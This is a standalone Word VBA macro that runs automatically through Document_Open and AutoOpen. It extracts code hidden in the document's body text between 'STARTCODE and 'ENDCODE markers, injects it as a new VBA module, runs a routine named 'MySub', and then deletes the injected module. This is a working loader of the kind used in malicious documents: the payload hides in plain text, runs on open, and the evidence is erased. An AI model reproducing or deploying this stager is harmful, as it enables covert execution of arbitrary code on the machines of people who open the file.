Sub MyMacro()
    Dim para As Paragraph
    Dim codeLines As String
    Dim comp As VBComponent
    Dim CodeModule As CodeModule
    Dim line As String
    Dim i As Long
Dim totalParas As Long

totalParas = ActiveDocument.Paragraphs.Count
    

For i = 1 To totalParas
    If Trim(ActiveDocument.Paragraphs(i).Range.Text) Like "*'STARTCODE*" Then
        i = i + 1
        Do While i <= totalParas
            line = ActiveDocument.Paragraphs(i).Range.Text
            If Trim(line) Like "*'ENDCODE*" Then Exit Do
            codeLines = codeLines & line
            i = i + 1
        Loop
        Exit For
    End If
Next i

    If codeLines = "" Then
        MsgBox "No code found between 'STARTCODE and 'ENDCODE"
        Exit Sub
    End If

    ' Add new module and insert code
    Set comp = ThisDocument.VBProject.VBComponents.Add(vbext_ct_StdModule)
    Set CodeModule = comp.CodeModule

    CodeModule.AddFromString codeLines

    ' Execute a known subroutine
    Application.Run "MySub"

    ' Optional: Clean up (remove injected module)
    ThisDocument.VBProject.VBComponents.Remove comp
End Sub

Sub Run()
    MyMacro
End Sub

Sub Document_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub

